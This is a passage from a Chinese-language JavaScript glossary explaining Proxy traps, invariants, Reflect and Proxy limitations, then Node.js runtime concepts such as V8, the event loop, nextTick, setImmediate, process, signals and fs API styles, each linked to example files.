拦截**写入属性**（`proxy.x = v`、`++proxy.n`、`Object.assign` 写入等），签名是 `set(target, key, value, receiver)`。它**必须返回布尔值**：返回 `false`（或在严格模式下被调用时）会让赋值抛 `TypeError`；返回 `undefined` 等同 `false`，这是「代理一创建就写不进任何东西」的经典原因（忘记 `return true`）。标准写法是 `return Reflect.set(target, key, value, receiver)`，让默认语义（包括 setter 调用、`receiver` 的传递、只读属性拒绝）原样保留；不要写成 `target[key] = value`，那样会绕过 setter 并把 `receiver` 丢掉。校验型代理就靠在这里比较新旧值并抛错来实现「拒绝非法写入」。也见 [get trap](#get-trapget-陷阱)、[Validation Proxy（校验型代理）](#validation-proxy校验型代理)。

示例：[`25_proxy_and_reflect/05_validation_proxy.js`](25_proxy_and_reflect/05_validation_proxy.js)

### has / deleteProperty traps（has 与 deleteProperty 陷阱）

`has(target, key)` 拦截 `key in proxy`（注意它**不拦截**读取，也不被 `Object.keys` 使用）；`deleteProperty(target, key)` 拦截 `delete proxy.key`，且必须返回布尔值表示是否删除成功。两者最常见的组合用途是「隐藏字段」：让 `'secret' in proxy` 返回 `false`、`delete` 之后连读取也返回 `undefined`，从而实现软删除/遮蔽。陷阱约束来自不变量：如果 `target` 有对应的**不可配置**自有属性，`has` 就必须返回 `true`，如果 `target` 不可扩展则不能凭空报告存在，`deleteProperty` 也不能删掉不可配置属性。注意 `for...in`、`Object.keys`、`JSON.stringify` 走的是 `ownKeys` + `getOwnPropertyDescriptor`，**不是** `has`，所以「隐藏」要在多处配合。也见 [ownKeys trap](#ownkeys-trapownkeys-陷阱)。

示例：[`25_proxy_and_reflect/03_has_delete_traps.js`](25_proxy_and_reflect/03_has_delete_traps.js)

### ownKeys trap（ownKeys 陷阱）

拦截**枚举自有键**，签名 `ownKeys(target)`，必须返回一个**数组**（元素是字符串或 Symbol），它是 `Object.keys`、`Object.getOwnPropertyNames`、`Object.getOwnPropertySymbols`、`for...in`、`JSON.stringify`、`Object.assign`、展开运算等一大票操作的第一步。不变量很严格：返回的列表必须包含 `target` 上**所有不可配置**的自有键；如果 `target` 不可扩展，则必须**恰好等于** `target` 的自有键（不能多也不能少）。常见坑是「不该出现的键」：只做 `ownKeys: () => ['a', 'b']` 却忘了 `target` 上还有别的可配置属性时行为正常，但一旦 `target` 被 `Object.freeze()`，代理就会开始抛 `TypeError`。另外，`JSON.stringify(proxy)` 还需要 `getOwnPropertyDescriptor` 配合返回**可枚举**的描述符，否则键会被过滤掉。也见 [has / deleteProperty traps](#has-deleteproperty-trapshas-与-deleteproperty-陷阱)。

示例：[`25_proxy_and_reflect/03_has_delete_traps.js`](25_proxy_and_reflect/03_has_delete_traps.js)

### apply / construct traps（apply 与 construct 陷阱）

当 `target` 是**函数**时，`apply(target, thisArg, argsList)` 拦截 `proxy(...)`、`proxy.call/apply`、`Reflect.apply`；`construct(target, argsList, newTarget)` 拦截 `new proxy(...)` 与 `Reflect.construct`。`apply` 里标准写法是 `return Reflect.apply(target, thisArg, args)`，`construct` 里是 `return Reflect.construct(target, args, newTarget)` —— 注意 `newTarget` 的传递，它决定了新对象用哪个 `prototype`（`Reflect.construct` 允许 `newTarget` 与 `target` 不同，这是 `Function.prototype.bind` 之外唯一能做到「借构造函数但换原型」的手段）。实用场景：给函数加缓存/节流/参数校验/埋点、把 `class` 包装成必须用 `new` 调用的形式、或者给构造函数做参数归一化。也见 [Trap（陷阱）](#trap陷阱)。

示例：[`25_proxy_and_reflect/04_apply_construct_traps.js`](25_proxy_and_reflect/04_apply_construct_traps.js)

### Invariant（不变量）

规范对每个陷阱施加的**强制约束**：代理不能对「不可配置 / 不可写 / 不可扩展」的目标说出与之矛盾的话，一旦违反就抛 `TypeError`。典型例子：`get` 不能为不可配置且不可写的自有数据属性返回不同的值；`has` 不能对不可配置的自有属性返回 `false`；`getPrototypeOf` 与 `setPrototypeOf` 在 `target` 不可扩展时被锁死；`isExtensible`/`preventExtensions` 不能与 `target` 的实际状态矛盾（所以 `preventExtensions` 必须先 `Reflect.preventExtensions(target)` 再返回 `true`）。设计意图是保住「代理不会打破 JS 对象模型的基本一致性」这一承诺。实践中的两个陷阱：`Object.freeze(proxy)` 或 `Object.preventExtensions(proxy)` 之后，之前宽松的陷阱会**突然开始抛错**；用 `Object.getOwnPropertyDescriptor` 校验型代理时，忘记处理不可配置属性会做出「看起来随机」的失败。也见 [Proxy（代理对象）](#proxy代理对象)。

示例：[`25_proxy_and_reflect/03_has_delete_traps.js`](25_proxy_and_reflect/03_has_delete_traps.js)

### Proxy.revocable（可撤销代理）

`Proxy.revocable(target, handler)` 返回 `{ proxy, revoke }` 两个字段，调用 `revoke()` 之后代理被**永久作废** —— 此后对它做任何操作（读、写、`in`、调用）都会抛 `TypeError`（"Cannot perform 'get' on a proxy that has been revoked"），但 `target` 本身不受影响，仍可正常使用。这是「能力回收」的经典实现：把代理交给第三方代码（插件、回调、`postMessage` 的另一端），需要时一句 `revoke()` 就能让它的所有句柄同时失效，比你手动维护一堆 `if (disposed)` 判断更可靠。注意 `revoke` 是**幂等**的（多次调用不报错），并且撤销后 `target` 若没有其他引用就会一起被回收（代理对 target 是强引用，但代理自己是弱可达的）。也见 [Proxy（代理对象）](#proxy代理对象)。

示例：[`25_proxy_and_reflect/05_validation_proxy.js`](25_proxy_and_reflect/05_validation_proxy.js)

### Proxy Limitations（Proxy 的局限）

代理不是「万能透明包装」，有四类硬性边界：(1) **性能开销** —— 每次属性访问都要多走一层陷阱函数，热路径上代价显著，陷阱越多越慢；(2) **内部槽（internal slots）** —— `Map`/`Set`/`Date`/`RegExp`/`Promise`/定型数组/`ArrayBuffer` 的状态不在属性里，方法内部会用「品牌检查（brand check）」确认 `this` 真的拥有那个内部槽，代理没有，于是调用即抛 `TypeError: Method Map.prototype.get called on incompatible receiver`；(3) **私有字段（`#field`）** —— 私有字段的可见性检查认的是「是不是声明它的那个类」，代理对象不是，一读就抛；(4) **透明性漏洞** —— `proxy !== target`、`structuredClone(proxy)` 抛 `DataCloneError`、Node 的 `util.types.isProxy` 能一眼识别。常见的临时解法是在 `get` 陷阱里把方法 `bind` 回 `target`，代价是 `proxy.fn === proxy.fn` 变成 `false`。也见 [Internal Slot（内部槽）](#internal-slot内部槽)、[Private Field and Proxy（私有字段与代理）](#private-field-and-proxy私有字段与代理)。

示例：[`25_proxy_and_reflect/10_proxy_limitations.js`](25_proxy_and_reflect/10_proxy_limitations.js)

### Transparent Proxy（代理的透明性）

「代理能否被当成目标本身使用」的问题，答案是**不能完全透明**：`proxy !== target`（引用不同）、`proxy === proxy` 但 `Object.getPrototypeOf(proxy) === Object.getPrototypeOf(target)` 只是因为在陷阱里转发了、`Object.prototype.toString.call(proxy)` 也未必一致、`structuredClone` 会因为「无法克隆代理」而抛错、Node 的 `util.types.isProxy(proxy)` 直接返回 `true`（浏览器没有对应手段，这正是它「不可检测」的另一面）。另一方面，有些操作**会穿透代理**：`Array.isArray(proxy)` 对数组目标的代理返回 `true`（它看的是目标的内部槽）。实践结论：代理适合「我自己可控的包装层」，不适合伪装成目标穿越不能控制边界的 API（`structuredClone`、`postMessage`、第三方库的 `instanceof` 检查等）。也见 [Proxy Limitations（Proxy 的局限）](#proxy-limitationsproxy-的局限)。

示例：[`25_proxy_and_reflect/10_proxy_limitations.js`](25_proxy_and_reflect/10_proxy_limitations.js)

### Reflect（反射对象）

ES2015 引入的全局对象，提供 **13 个静态方法**，与 13 个 `Proxy` 陷阱**严格一一对应**：`Reflect.get/set/has/deleteProperty/ownKeys/getOwnPropertyDescriptor/defineProperty/getPrototypeOf/setPrototypeOf/isExtensible/preventExtensions/apply/construct`。它存在的意义就是「把语言内部方法（internal methods）暴露成普通函数」，因此 `Proxy` 陷阱里调用 `Reflect.get(target, key, receiver)` 就等于「执行这一步的默认行为」，这是写代理的标准姿势。另外它是**工具函数集合而不是构造函数**（不能 `new Reflect()`，没有 `prototype`），方法都挂在对象本身上。也见 [Reflect vs Object](#reflect-vs-objectreflect-与-object-的差异)、[Internal Method（内部方法）](#internal-method内部方法)。

示例：[`25_proxy_and_reflect/08_reflect_api.js`](25_proxy_and_reflect/08_reflect_api.js)

### Internal Method（内部方法）

规范用 `[[Xxx]]` 记号描述对象上「引擎内部才有的操作与状态」：内部方法如 `[[Get]]`、`[[Set]]`、`[[HasProperty]]`、`[[Delete]]`、`[[OwnPropertyKeys]]`、`[[Call]]`、`[[Construct]]`、`[[GetPrototypeOf]]`；内部槽（internal slot）则是内部状态，如 `[[MapData]]`、`[[DateValue]]`、`[[PromiseState]]`、`[[TypedArrayName]]`。普通对象和代理**实现了同一套内部方法**，所以可以用同样的语法操作（这正是代理能生效的机制）；但**内部槽不同** —— 代理没有 `target` 的内部槽，所以 `Map.prototype.get` 这类方法在代理上会因为品牌检查失败而抛错。`Reflect` 的每个方法恰好对应一个内部方法，这就是「`Reflect` 和陷阱一一对应」的由来。也见 [Internal Slot（内部槽）](#internal-slot内部槽)、[Proxy Limitations（Proxy 的局限）](#proxy-limitationsproxy-的局限)。

示例：[`25_proxy_and_reflect/08_reflect_api.js`](25_proxy_and_reflect/08_reflect_api.js)

### Internal Slot（内部槽）

对象上**不可通过属性访问**的内部状态，只有对应的内置方法才能读到，例如 `Map` 的 `[[MapData]]`、`Date` 的 `[[DateValue]]`、`RegExp` 的 `[[RegExpMatcher]]`、`Promise` 的 `[[PromiseState]]`、定型数组的 `[[ViewedArrayBuffer]]`。它的存在解释了代理的第三类局限：`Map.prototype.get.call(proxyMap, k)` 会先做「品牌检查」确认 `this` 拥有 `[[MapData]]`，代理只有 `[[ProxyTarget]]`，于是立刻抛 `TypeError: Method Map.prototype.get called on incompatible receiver #<Map>`。绕法只有两条：在 `get` 陷阱里把方法 `bind(target)`（代价是函数身份每次都变），或者干脆别代理这类对象、改成手写包装类显式转发几个方法（更推荐）。也见 [Internal Method（内部方法）与内部槽](#internal-method内部方法)。

示例：[`25_proxy_and_reflect/10_proxy_limitations.js`](25_proxy_and_reflect/10_proxy_limitations.js)

### Private Field and Proxy（私有字段与代理）

类的私有字段 `#x` 的访问检查只认「当前执行的代码所属的类是否在 `receiver` 上声明了这个私有名」：代理对象的 `[[PrivateElements]]` 为空，所以在 `get` 陷阱里只要返回 `target` 上的方法（这些方法内部会读 `this.#x`，而 `this` 是代理），调用时就会抛 `TypeError: Cannot read private member #x from an object whose class did not declare it`。实用结论：**类实例上有私有字段时，不能直接代理该实例并转发它的方法**。可行的应对是：让方法在陷阱里 `bind(target)`、把私有数据改用 `WeakMap` 存放（WeakMap 的键是对象，代理和 target 是两个不同对象，仍要注意用哪个当键）、或者不代理实例而只在类的外部包一层显式的适配器。也见 [Proxy Limitations（Proxy 的局限）](#proxy-limitationsproxy-的局限)。

示例：[`25_proxy_and_reflect/10_proxy_limitations.js`](25_proxy_and_reflect/10_proxy_limitations.js)

### Reflect vs Object（Reflect 与 Object 的差异）

同名方法的两组 API，差异集中在四点：(1) **失败时的行为** —— `Object.defineProperty` / `Object.freeze` / `Object.getPrototypeOf` 失败会**抛错**，而 `Reflect.defineProperty` / `Reflect.preventExtensions` 返回**布尔值**，`Reflect.deleteProperty` 也返回布尔值（`delete` 在严格模式下会抛错），这让「探测而不中断」的写法成为可能，也是代理陷阱必须返回布尔值的原因；(2) **返回值** —— `Object.defineProperty` 返回**对象本身**，`Reflect.defineProperty` 返回 `true/false`；(3) **接收者参数** —— 只有 `Reflect.get/set` 有 `receiver` 参数，`Object` 版本没有；(4) **类型强转与键的覆盖范围** —— `Reflect.getPrototypeOf(1)` 抛 `TypeError` 而 `Object.getPrototypeOf(1)` 会强转成包装对象，`Reflect.ownKeys` 返回**字符串 + Symbol + 不可枚举**的全部自有键，而 `Object.keys` 只返回可枚举的字符串键。也见 [Reflect（反射对象）](#reflect反射对象)。

示例：[`25_proxy_and_reflect/09_reflect_vs_object.js`](25_proxy_and_reflect/09_reflect_vs_object.js)

### Reactive（响应式原理）

用 `Proxy` 实现「数据变化自动触发视图更新」的机制，是 Vue 3 等框架的核心：`get` 陷阱在读取时**收集依赖**（把当前正在运行的副作用函数记录到「目标对象 → 属性 → 副作用集合」的三级结构里，通常用 `WeakMap<target, Map<key, Set<effect>>>`），`set` 陷阱在写入时**触发依赖**（把该属性的副作用都重新执行一遍）。两个关键细节：(1) `get` 里必须用 `Reflect.get(target, key, receiver)` 并传 `receiver`，否则嵌套对象的读取不会被追踪；(2) 只有**被访问过**的属性才被追踪（惰性深层代理），所以 `obj.newField = 1` 这种新增属性不会自动变成响应式（Vue 3 里靠 `reactive()` 重新包裹解决，`Vue 2` 的 `Object.defineProperty` 方案则完全无法侦测新增/删除）。此外 `WeakMap` 的弱引用保证「对象被回收时依赖表也自动清理」。也见 [get trap](#get-trapget-陷阱)、[set trap](#set-trapset-陷阱)。

示例：[`25_proxy_and_reflect/06_observable_proxy.js`](25_proxy_and_reflect/06_observable_proxy.js)

### Validation Proxy（校验型代理）

在 `set`/`deleteProperty`/`defineProperty` 陷阱里做**运行时约束**的代理写法，能表达「类型不对就抛错」「未知字段一律拒绝」「对象创建后只读」这类普通对象做不到的语义。典型实现是维护一份 `schema`（字段 → 校验函数或类型），`set` 时先校验再决定抛错还是 `Reflect.set` 转发；只读包装则直接 `throw new TypeError(...)` 或返回 `false`。要注意三个边界：校验只覆盖**经过代理**的访问（有 `target` 引用的人可以绕过），不能防住 `Object.defineProperty(target, ...)` 之类的直接操作；`set` 必须返回布尔值；深层结构需要递归代理，而递归代理会带来性能与身份（`proxy.a !== proxy.a`）问题。也见 [set trap](#set-trapset-陷阱)、[Invariant（不变量）](#invariant不变量)。

示例：[`25_proxy_and_reflect/05_validation_proxy.js`](25_proxy_and_reflect/05_validation_proxy.js)

### Negative Array Index（负索引数组）

用 `Proxy` 给数组补上 Python 风格的负下标（`arr[-1]` 取最后一个元素）的常见练习：在 `get` 和 `set` 陷阱里判断 `key` 是否为负数字符串，先用 `Number(key)` 转换，再换算成 `target.length + n`，其余键交给 `Reflect` 透传。三个必须处理的细节：(1) 属性键是**字符串**（`-1` 不是数字 `-1`），必须显式转换，而 `'-0'`、`'1e2'`、`' 1 '` 这些形式要用 `Number.isInteger` 之类的判据挡掉，否则会把普通属性名误当成下标；(2) `has`、`deleteProperty`、`ownKeys` 也要考虑，否则 `-1 in arr`、`delete arr[-1]`、`JSON.stringify` 会不一致；(3) 支持负索引就等于放弃了「所有属性都是合法下标」的假设，要防止用户写出让 `length` 语义混乱的代码。同类技巧还包括「默认值对象」（读不存在的键返回默认值）—— 但要注意 `'x' in proxy` 与 `Object.keys` 不会自动跟着变。也见 [get trap](#get-trapget-陷阱)。

示例：[`25_proxy_and_reflect/07_negative_array_index.js`](25_proxy_and_reflect/07_negative_array_index.js)

---

## Node.js 运行时

### Node.js（Node.js 运行时）

Node.js 是把 **V8 引擎**与**宿主能力**（文件、网络、进程、系统调用）捆在一起的 JavaScript 运行时，让 JS 脱离浏览器也能在服务端与命令行里运行。它的技术定位是：**单个 JS 执行线程 + 非阻塞 I/O + 事件循环**，用很少的线程撑起大量并发连接。关键细节：Node 既不是语言也不是框架——语言规范由 V8 提供，Node 只负责「语言之外的一切」（模块系统、内置库、进程与 I/O 接口）。**常见误解**：以为 Node 就是「浏览器里的 JS 换个地方跑」——它没有 `window`/`document`/DOM，却多了 `process`、`Buffer`、`fs`、`node:` 前缀的内置模块。

也见 [Node.js Host Environment（Node 宿主环境）](#nodejs-host-environmentnode-宿主环境)、[Event Loop（事件循环）](#event-loop事件循环)。

示例：[`00_hello_world/04_node_vs_browser.js`](00_hello_world/04_node_vs_browser.js)、[`26_node_core/01_process_object.js`](26_node_core/01_process_object.js)

### Runtime（运行时）

运行时是「让 JavaScript 代码真正跑起来」的整套基础设施，可以拆成三层：**引擎**（解析与执行代码，如 V8）、**宿主环境**（提供语言之外的 API，如浏览器的 DOM 或 Node 的 `fs`）、**内置库**（标准化的宿主 API 集合）。同一段 JS 换一个运行时，能用的 API 就完全变了——`setTimeout` 在浏览器和 Node 里都存在，但那是因为两边各自实现，而不是语言语法。关键细节：ECMAScript 只规定语言本身，`console`、`setTimeout`、`fetch` 全都属于宿主，由此才能解释「浏览器能跑、Node 报 `document is not defined`」这类现象。

也见 [Node.js（Node.js 运行时）](#nodejsnodejs-运行时)、[V8 Engine（V8 引擎）](#v8-enginev8-引擎)。

示例：[`00_hello_world/04_node_vs_browser.js`](00_hello_world/04_node_vs_browser.js)

### V8 Engine（V8 引擎）

V8 是 Google 为 Chrome 开发的 JavaScript 引擎，也是 Node.js 的执行内核，负责把 JS 源码变成机器码并管理内存。它把「解释执行」与「编译执行」结合：先由 **Ignition** 解释器快速跑起来并收集类型反馈，热点函数再交给 **TurboFan** 优化编译器生成高效机器码。关键细节：V8 只管 JS 语言本身，**定时器、文件、网络一律不归它管**；它还负责垃圾回收，因此「对象形状稳定」的代码（不要随意增删属性）跑得更快。可以用 `process.versions.v8` 查看当前版本。

也见 [JIT / Just-In-Time Compilation（即时编译）](#jit-just-in-time-compilation即时编译)、[Thread Pool（线程池）](#thread-pool线程池)。

示例：[`26_node_core/01_process_object.js`](26_node_core/01_process_object.js)

### JIT / Just-In-Time Compilation（即时编译）

JIT 是「**运行时才编译**」的编译策略：代码不预先编译成机器码，而是在执行过程中，引擎识别出反复执行的「热点」代码后再编译成高度优化的机器码。它把解释器的启动快和编译器的执行快结合起来，这是现代 JS 性能的基础。关键细节：优化依赖**类型反馈**——同一个函数如果一会儿收到数字一会儿收到字符串，优化后的代码会被「去优化」（deopt）退回解释执行，这正是「保持类型稳定」的性能建议的来源。**常见误解**：以为 JIT 让 JS 变成「真正的编译语言」——优化随时可能失效，JS 的性能是可预测性差于静态语言的。

也见 [V8 Engine（V8 引擎）](#v8-enginev8-引擎)。

示例（性能册）：[`31_performance_and_memory/08_object_shape_optimization.js`](31_performance_and_memory/08_object_shape_optimization.js)

### Node.js Host Environment（Node 宿主环境）

Node 的宿主环境提供了一套**面向系统**的全局能力：`process`（进程信息与控制）、`Buffer`（二进制数据）、`console`、定时器、`fetch`、以及 `node:fs`、`node:http` 等内置模块。与浏览器宿主最大的区别在于：Node 没有 DOM、没有同源策略、没有 `window`；反过来浏览器没有文件系统、没有进程信号、没有 `__dirname`。这解释了大量「同一段代码两边行为不同」的现象——例如 `fetch` 在两边都可用的、而 `localStorage` 只在浏览器存在。**常见误解**：以为 `globalThis` 在两边是同一个东西——名字相同，但上面挂的属性完全不同。

也见 [Browser Runtime（浏览器运行时）](#browser-runtime浏览器运行时)、[Runtime（运行时）](#runtime运行时)。

示例：[`00_hello_world/04_node_vs_browser.js`](00_hello_world/04_node_vs_browser.js)

### Event Loop（事件循环）

事件循环是 Node 的**调度中枢**：它不断地从各个队列里取出回调来执行，让单线程的 JS 也能处理成千上万的并发 I/O。工作模型是「**回调登记 → 交给 libuv → 内核完成 → 回调入队 → 循环取出执行**」，因此 JS 代码永远不会真的「等在 I/O 上」，而是先返回、等事件。关键细节：事件循环**只在同步代码跑完、且没有待处理任务时才会退出**——这既是「服务器持续运行」的原因，也是「忘了 close 的定时器会让进程不退」的原因。

也见 [Event Loop Phases（事件循环的六个阶段）](#event-loop-phases事件循环的六个阶段)、[libuv（libuv）](#libuvlibuv)。

示例：[`26_node_core/11_timers.js`](26_node_core/11_timers.js)

### Event Loop Phases（事件循环的六个阶段）

Node 的事件循环每一轮（tick）大致按六个阶段依次推进：**timers**（执行到期的 `setTimeout`/`setInterval` 回调）→ **pending callbacks**（上一轮延迟的系统回调，如某些 TCP 错误）→ **poll**（等待并执行 I/O 回调，没有活可干时会在这里阻塞）→ **check**（执行 `setImmediate` 回调）→ **close callbacks**（`socket.on('close')` 之类）。在两个阶段之间，Node 还会清空 **`process.nextTick` 队列**和 **Promise 微任务队列**。关键细节：`setTimeout(fn, 0)` 与 `setImmediate(fn)` 的先后顺序在 I/O 回调内部是确定的（`setImmediate` 先），在主模块里却可能不确定——因为第一轮进 poll 阶段的时机不定。

也见 [process.nextTick（nextTick 队列）](#processnextticknexttick-队列)、[setImmediate（check 阶段）](#setimmediatecheck-阶段)。

示例：[`26_node_core/11_timers.js`](26_node_core/11_timers.js)

### process.nextTick（nextTick 队列）

`process.nextTick(fn)` 把回调插到 **nextTick 队列**，它**不属于事件循环的任何阶段**，而是在当前操作结束后、进入下一阶段前立刻清空——优先级高于 Promise 微任务，也高于所有定时器。用途是在「同步代码还没走完」时保证顺序，例如把错误异步抛出、让构造函数先返回对象再触发回调。**关键细节与常见误解**：`nextTick` **不是**「下一轮事件循环」，它是「本轮立刻」；而且递归调用 `nextTick` 会**饿死事件循环**——I/O 与定时器永远排不上队，因为 nextTick 队列只要非空就会被一直清空。

也见 [setImmediate（check 阶段）](#setimmediatecheck-阶段)、[Microtask（微任务）](#microtask微任务)。

示例：[`26_node_core/01_process_object.js`](26_node_core/01_process_object.js)

### setImmediate（check 阶段）

`setImmediate(fn)` 在事件循环的 **check 阶段**执行回调，也就是「当前这一轮 I/O 处理完之后、下一轮 timers 之前」。它与 `process.nextTick` 常被搞混：**语义上 `setImmediate` 才是「稍后」，而 `nextTick` 是「立刻」**。实际排序规律是：`nextTick` → Promise 微任务 → `setImmediate` → 定时器（在 I/O 回调内部尤其稳定，`setImmediate` 一定早于 `setTimeout(fn, 0)`）。**常见误解**：以为名字里的 "Immediate" 表示马上执行——恰恰相反，它是所有「延迟执行」里最靠后的一档，只是比定时器可靠（不受最小延迟与系统时钟粒度影响）。

也见 [process.nextTick（nextTick 队列）](#processnextticknexttick-队列)、[Event Loop Phases（事件循环的六个阶段）](#event-loop-phases事件循环的六个阶段)。

示例：[`26_node_core/11_timers.js`](26_node_core/11_timers.js)

### Microtask（微任务）

微任务是 Promise 回调（`.then`/`await` 之后的部分）、`queueMicrotask` 以及 `MutationObserver` 回调所在的队列，**每执行完一个宏任务（一段同步脚本、一个定时器回调）就会整体清空一次**，且中途新加入的微任务也会在同一轮被处理完。它与 `nextTick` 队列的关系是：两者都在阶段之间清空，但 **`nextTick` 队列先于微任务队列**。关键细节：`await` 会把函数剩余部分变成微任务，所以「`await` 之后代码的执行时机」比很多人想象得更早——它在当前同步任务结束后立即恢复，不必等定时器。

也见 [process.nextTick（nextTick 队列）](#processnextticknexttick-队列)、[Event Loop（事件循环）](#event-loop事件循环)。

示例：[`26_node_core/11_timers.js`](26_node_core/11_timers.js)

### process Object（process 对象）

`process` 是 Node 注入的**全局对象**，代表「当前正在运行的这个 node 进程」，任何模块里都能直接使用，不需要 import。它提供三类东西：**信息**（`process.version`、`process.versions`、`process.platform`、`process.pid`、`process.cwd()`）、**输入**（`process.argv`、`process.env`）、**控制**（`process.exit()`、`process.exitCode`、`process.on('SIGINT')`、`process.nextTick`、标准输入输出流）。关键细节：它是**单例**，且进程级状态（如 `exitCode`、环境变量）一旦改动对整个程序生效。

也见 [process.argv（命令行参数）](#processargv命令行参数)、[process.env（环境变量）](#processenv环境变量)。

示例：[`26_node_core/01_process_object.js`](26_node_core/01_process_object.js)

### process.argv（命令行参数）

`process.argv` 是命令行参数的**字符串数组**，前两项固定为 `node` 可执行文件路径与脚本文件路径，**真正的参数从索引 2 开始**（所以 `process.argv.slice(2)` 是最常见的写法）。关键细节：所有值都是字符串，数字要自己用 `Number()` 转换；带空格的值必须由调用方用引号包住，否则会被 shell 拆成多个参数。**常见误解**：以为 `argv[0]` 是脚本名——它是 `node` 的路径，脚本名在 `argv[1]`；参数一多就该改用 `node:util` 的 `parseArgs`，别再手写解析循环。

也见 [node:util（parseArgs / promisify / inspect）](#nodeutilparseargs-promisify-inspect)、[process Object（process 对象）](#process-objectprocess-对象)。

示例：[`26_node_core/18_cli_args_and_signals.js`](26_node_core/18_cli_args_and_signals.js)

### process.env（环境变量）

`process.env` 是操作系统传给进程的一组「键 = 值」字符串集合，是「十二要素应用」推荐的配置方式：把端口、数据库地址、密钥放在环境里，而不是写死在代码里。关键细节：**取值永远是字符串或 `undefined`**，`PORT=3000` 读出来是 `"3000"`，要自己转数字；给不存在的键赋值不会报错，可以借此设置默认值（如 `process.env.NODE_ENV ??= 'development'`）。**常见误解与安全要点**：环境变量对进程内的所有代码可见，也会被子进程继承，因此**不要把密钥泄露进日志或前端代码**；`.env` 文件只是本地开发的便利，不该提交进版本库。

也见 [node:util（parseArgs / promisify / inspect）](#nodeutilparseargs-promisify-inspect)、[Graceful Shutdown（优雅关闭）](#graceful-shutdown优雅关闭)。

示例：[`26_node_core/16_env_and_dotenv.js`](26_node_core/16_env_and_dotenv.js)

### Exit Code（退出码）

退出码是进程结束时返回给操作系统（进而给 shell 与 CI）的一个整数：**0 表示成功，非 0 表示某种失败**。Node 里有两种设置方式——设置 `process.exitCode = 1` 让进程**自然退出时**带上该值，或者调用 `process.exit(1)` **立刻**结束。关键细节：退出码是整个命令行工具链的契约，CI 靠它判断构建成败，`npm run` 靠它决定是否继续链式执行，`spawn`/`exec` 的回调也靠它判断子进程结果（被信号杀死时 `code` 为 `null`、`signal` 有值）。

也见 [process.exit（强制退出）](#processexit强制退出)、[Graceful Shutdown（优雅关闭）](#graceful-shutdown优雅关闭)。

示例：[`26_node_core/01_process_object.js`](26_node_core/01_process_object.js)、[`26_node_core/18_cli_args_and_signals.js`](26_node_core/18_cli_args_and_signals.js)

### process.exit（强制退出）

`process.exit(code)` 会**立即**结束进程：同步代码立刻中断，未完成的异步 I/O、未 flush 的输出、未执行的 `finally` 都可能被直接丢弃。关键细节：写文件、写 socket、`console.log` 到管道时都可能有缓冲区还没刷出去，**在 `exit` 前强行调用很容易丢数据**；正确做法是设置 `process.exitCode` 然后让事件循环自然结束，或先 `await` 完成清理再退出。**常见误解**：以为 `exit` 会「等待收尾」——它不会给任何回调机会，`process.on('exit')` 里也只能跑同步代码。

也见 [Exit Code（退出码）](#exit-code退出码)、[Graceful Shutdown（优雅关闭）](#graceful-shutdown优雅关闭)。

示例：[`26_node_core/01_process_object.js`](26_node_core/01_process_object.js)

### Graceful Shutdown（优雅关闭）

优雅关闭指收到终止请求后**停止接收新请求、把手上的活干完、释放资源、再退出**的过程，是服务端进程的基本素养。典型步骤是：监听 `SIGTERM`/`SIGINT` → 停止监听端口（`server.close()`）→ 等待进行中的请求与数据库事务结束 → 关闭连接池 → 设置退出码并退出；同时要设一个「兜底超时」，超时就强杀，避免永久挂起。关键细节：容器与进程管理器（Docker、systemd、PM2）默认发的是 `SIGTERM`，**不处理它就会导致请求被硬切断**；还要防备重复信号（连按 Ctrl+C）与 `unhandledRejection` 中断流程。

也见 [Process Signal / SIGTERM / SIGINT（进程信号）](#process-signal-sigterm-sigint进程信号)、[Exit Code（退出码）](#exit-code退出码)。

示例：[`26_node_core/18_cli_args_and_signals.js`](26_node_core/18_cli_args_and_signals.js)

### Process Signal / SIGTERM / SIGINT（进程信号）

信号是操作系统发给进程的**异步通知**，Node 通过 `process.on('SIGINT', handler)` 之类的方式注册处理函数。常用两个：**`SIGINT`** 由 Ctrl+C 触发（可被捕获后「忽略」），**`SIGTERM`** 是默认的「请你体面地退出」信号（同样可捕获），而 **`SIGKILL`（Windows 上是强杀）无法被捕获**，只能接受。关键细节：跨平台差异明显——Windows 没有真正的 POSIX 信号，libuv 只能退化成 `TerminateProcess`，因此 `SIGTERM` 在 Windows 上的语义并不可靠；另外注册了信号监听会让进程「不自动退出」，必须在处理函数里显式收尾。

也见 [Graceful Shutdown（优雅关闭）](#graceful-shutdown优雅关闭)、[child_process（子进程）](#child_process子进程)。

示例：[`26_node_core/18_cli_args_and_signals.js`](26_node_core/18_cli_args_and_signals.js)、[`26_node_core/10_child_process.js`](26_node_core/10_child_process.js)

### Callback API / Promise API / Sync API（三套 API 风格）

Node 的许多核心模块（最典型的是 `fs`）同时提供**三套等价 API**：同步版（`readFileSync`，直接返回结果、阻塞线程）、回调版（`readFile(path, cb)`，错误优先回调 `(err, data)`）、Promise 版（`node:fs/promises` 的 `readFile`，可 `await`）。它们不是三个不同的功能，而是同一次系统调用的三种包装方式。选择原则：**启动脚本与一次性 CLI 用同步版最省心；网络服务里一律用异步版**，否则一个慢磁盘就能卡死整个事件循环。回调版还能用 `util.promisify` 转成 Promise，避免手写包装。

也见 [Blocking vs Non-blocking I/O（阻塞式与非阻塞式 I/O）](#blocking-vs-non-blocking-io阻塞式与非阻塞式-io)、[node:fs（文件系统模块）](#nodefs文件系统模块)。

示例：[`26_node_core/04_fs_sync.js`](26_node_core/04_fs_sync.js)、[`26_node_core/05_fs_callback.js`](26_node_core/05_fs_callback.js)、[`26_node_core/06_fs_promises.js`](26_node_core/06_fs_promises.js)

### Blocking vs Non-blocking I/O（阻塞式与非阻塞式 I/O）

阻塞式 I/O 指调用发出后**线程停在那里等结果**（如 `readFileSync`），期间什么都做不了；非阻塞 I/O 指调用立刻返回，结果稍后通过回调/Promise 交付。Node 的并发能力正建立在后者之上：单线程也能同时「等」很多个 I/O，因为等待的代价被交给了操作系统。关键细节：**异步不等于并行**——CPU 密集的计算（大循环、压缩、加密）依然会卡住事件循环，那种场景需要 `worker_threads`；而 `fs` 的多数异步操作实际跑在 libuv 的**线程池**里，所以「异步」并不总是零成本。

也见 [Thread Pool（线程池）](#thread-pool线程池)、[libuv（libuv）](#libuvlibuv)。

示例：[`26_node_core/04_fs_sync.js`](26_node_core/04_fs_sync.js)、[`26_node_core/05_fs_callback.js`](26_node_core/05_fs_callback.js)

### libuv（libuv）

